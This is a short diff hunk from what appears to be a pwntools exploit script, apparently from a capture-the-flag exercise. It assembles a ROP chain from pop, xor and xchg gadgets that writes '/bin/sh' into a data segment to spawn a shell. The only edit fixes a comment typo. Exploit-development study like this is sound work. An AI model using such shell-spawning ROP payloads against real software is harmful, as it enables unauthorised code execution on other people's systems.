@@ -25,7 +25,7 @@ buf += 'junkjunk' #goes in to r14
 buf += pwn.p64(popR12)
 buf += pwn.p64(data_seg)
 buf += pwn.p64(xorGadget)
-buf += '/bin/sh\x00'  # there is a pop r12 after the xor so I dont have to popr12 again.
+buf += '/bin/sh\x00'  # there is a pop r12 after the xor so I dont have to pop r12 again.
 buf += pwn.p64(xchg)
 buf += 'junkjunk'    # r15 doesnt matter
 
